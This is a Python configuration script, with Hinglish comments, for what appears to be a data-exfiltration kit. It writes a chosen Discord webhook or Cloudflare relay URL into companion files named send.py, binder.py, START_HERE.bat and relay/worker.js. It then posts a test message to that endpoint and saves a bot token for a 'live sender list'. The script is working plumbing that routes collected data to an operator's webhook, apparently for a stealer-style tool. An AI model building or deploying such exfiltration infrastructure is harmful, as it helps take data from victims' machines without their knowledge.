"""setwebhook.py - data kaha jaye, ek jagah se set karo.

    python setwebhook.py                # menu
    python setwebhook.py --url URL      # seedha set + test
    python setwebhook.py --show         # abhi kya set hai
    python setwebhook.py --token TOKEN  # live sender list ke liye bot token

Jo URL do, wo hook.cfg me likha jata hai aur in files me patch hota hai:
    send.py          WEBHOOK
    binder.py        DEFAULT_WEBHOOK
    START_HERE.bat   set HOOK
    relay/worker.js  const HOOK
"""

from __future__ import annotations

import json
import re
import sys
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent
CFG = ROOT / "hook.cfg"
TOKEN_CFG = ROOT / "discord_read.json"
PLACEHOLDER = "FRIEND_WEBHOOK_ID"

DISCORD_RE = re.compile(
    r"^https://(?:discord(?:app)?\.com)/api/webhooks/(\d+)/([A-Za-z0-9_\-]+)/?$"
)
HTTPS_RE = re.compile(r'^https://[^\s"\'<>]+$')

TARGETS = (
    ("send.py", re.compile(r'^WEBHOOK\s*=\s*".*?"\s*$', re.M), 'WEBHOOK = "{url}"'),
    (
        "binder.py",
        re.compile(r'^DEFAULT_WEBHOOK\s*=\s*\(.*?\)\s*$', re.M | re.S),
        'DEFAULT_WEBHOOK = "{url}"',
    ),
    (
        "START_HERE.bat",
        re.compile(r'^if not defined HOOK set "HOOK=.*"$', re.M),
        'if not defined HOOK set "HOOK={url}"',
    ),
    ("START_HERE.bat", re.compile(r"^set HOOK=.*$", re.M), "set HOOK={url}"),
    (
        "relay/worker.js",
        re.compile(r'^const HOOK\s*=\s*".*?";?\s*$', re.M),
        'const HOOK = "{url}";',
    ),
)


def mask(url: str) -> str:
    """Token poora screen pe na chhape - sirf id aur aakhri 4 akshar."""
    match = DISCORD_RE.match(url or "")
    if match:
        wid, tok = match.group(1), match.group(2)
        return f"https://discord.com/api/webhooks/{wid}/...{tok[-4:]}"
    if len(url) <= 24:
        return url
    return url[:16] + "..." + url[-4:]


def read_hook() -> str:
    if CFG.exists():
        text = CFG.read_text(encoding="utf-8", errors="replace").strip()
        if text:
            return text
    send = ROOT / "send.py"
    if send.exists():
        match = re.search(
            r'^WEBHOOK\s*=\s*"(.*?)"', send.read_text(encoding="utf-8"), re.M
        )
        if match:
            return match.group(1).strip()
    return ""


def is_placeholder(url: str) -> bool:
    return (not url) or PLACEHOLDER in url or url.endswith("/TOKEN")


def validate(url: str) -> tuple[bool, str]:
    url = url.strip()
    if not url:
        return False, "URL khali hai"
    if not HTTPS_RE.match(url):
        return False, "URL https:// se shuru hona chahiye"
    if DISCORD_RE.match(url):
        return True, "discord"
    if "discord.com/api/webhooks" in url or "discordapp.com/api/webhooks" in url:
        return False, "Discord webhook ka format galat hai (ID/TOKEN check karo)"
    return True, "relay"


def patch_file(rel: str, pattern: re.Pattern[str], template: str, url: str) -> str:
    path = ROOT / rel
    if not path.exists():
        return "missing"
    text = path.read_text(encoding="utf-8", errors="replace")
    new, count = pattern.subn(template.format(url=url), text, count=1)
    if count == 0:
        return "anchor-missing"
    if new != text:
        path.write_text(new, encoding="utf-8", newline="\n")
        return "patched"
    return "already"


def save(url: str) -> list[tuple[str, str]]:
    CFG.write_text(url + "\n", encoding="utf-8")
    results: list[tuple[str, str]] = [("hook.cfg", "written")]
    seen: dict[str, list[str]] = {}
    for rel, pattern, template in TARGETS:
        seen.setdefault(rel, []).append(patch_file(rel, pattern, template, url))
    for rel, states in seen.items():
        if "patched" in states:
            results.append((rel, "patched"))
        elif "already" in states:
            results.append((rel, "already"))
        elif "missing" in states:
            results.append((rel, "file missing"))
        else:
            results.append((rel, "anchor missing"))
    return results


def send_test(url: str, content: str = "webhook check - zinda hai") -> int:
    sep = "&" if "?" in url else "?"
    body = json.dumps({"content": content}).encode("utf-8")
    request = urllib.request.Request(
        url + sep + "wait=true",
        data=body,
        headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
    )
    with urllib.request.urlopen(request, timeout=20) as response:
        return response.status


def save_token(token: str) -> None:
    TOKEN_CFG.write_text(
        json.dumps({"bot_token": token.strip()}, indent=2) + "\n", encoding="utf-8"
    )


def show() -> int:
    hook = read_hook()
    print()
    print("   data jayega  :", mask(hook) if hook else "(set nahi hai)")
    print("   hook.cfg     :", "hai" if CFG.exists() else "nahi")
    if TOKEN_CFG.exists():
        try:
            token = json.loads(TOKEN_CFG.read_text(encoding="utf-8")).get(
                "bot_token", ""
            )
        except (json.JSONDecodeError, OSError):
            token = ""
        print("   bot token    :", "(set)" if token and token != "FILL" else "(nahi)")
    else:
        print("   bot token    : (nahi)")
    print()
    return 0


def apply_url(url: str, do_test: bool) -> int:
    ok, kind = validate(url)
    if not ok:
        print("   [!!]", kind)
        return 2
    url = url.strip()

    print()
    print("   destination  :", "Discord webhook" if kind == "discord" else "Relay URL")
    print("   url          :", mask(url))
    print()
    for rel, state in save(url):
        print(f"   {'[OK]' if state in ('written', 'patched', 'already') else '[--]'} {rel:<16} {state}")

    if do_test:
        print()
        print("   test bhej rahe hain...")
        try:
            status = send_test(url)
        except urllib.error.HTTPError as exc:
            print(f"   [!!] HTTP {exc.code} - webhook galat ya delete ho gaya")
            return 3
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            print(f"   [!!] net problem: {exc}")
            return 3
        print(f"   [OK] HTTP {status} - Discord me 'webhook check' dikhna chahiye")
    print()
    return 0


def interactive() -> int:
    while True:
        hook = read_hook()
        print()
        print("   ===============================================")
        print("      DATA KAHA JAYE")
        print("   ===============================================")
        print("   abhi:", mask(hook) if hook else "(set nahi hai)")
        print()
        print("      1   Discord webhook set karo")
        print("      2   Relay URL set karo (Cloudflare worker)")
        print("      3   abhi kya set hai, dikhao")
        print("      4   live sender list ke liye bot token")
        print("      5   webhook test bhejo")
        print("      0   wapas")
        print()
        pick = input("   number: ").strip()
        if pick == "0":
            return 0
        if pick == "3":
            show()
            continue
        if pick == "5":
            if is_placeholder(hook):
                print("   [!!] pehle webhook set karo")
                continue
            try:
                print("   [OK] HTTP", send_test(hook))
            except urllib.error.HTTPError as exc:
                print(f"   [!!] HTTP {exc.code}")
            except (urllib.error.URLError, TimeoutError, OSError) as exc:
                print(f"   [!!] {exc}")
            continue
        if pick == "4":
            token = input("   bot token (khali chhodne par cancel): ").strip()
            if token:
                save_token(token)
                print("   [OK] discord_read.json likh diya")
            continue
        if pick in ("1", "2"):
            if pick == "1":
                print()
                print("   Discord: Server Settings -> Integrations -> Webhooks")
                print("   -> New Webhook -> Copy Webhook URL -> yahan paste karo")
            else:
                print()
                print("   relay/worker.js deploy karke uski https URL paste karo")
            url = input("   url: ").strip().strip('"')
            if not url:
                continue
            answer = input("   test message bhejein? (y/n): ").strip().lower()
            apply_url(url, answer != "n")
            continue
        print("   [!!] 0-5 me se chuno")


def main(argv: list[str]) -> int:
    if "--show" in argv:
        return show()
    if "--url" in argv:
        index = argv.index("--url")
        if index + 1 >= len(argv):
            print("   [!!] --url ke baad URL do")
            return 2
        return apply_url(argv[index + 1], "--no-test" not in argv)
    if "--token" in argv:
        index = argv.index("--token")
        if index + 1 >= len(argv):
            print("   [!!] --token ke baad token do")
            return 2
        save_token(argv[index + 1])
        print("   [OK] discord_read.json likh diya")
        return 0
    return interactive()


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
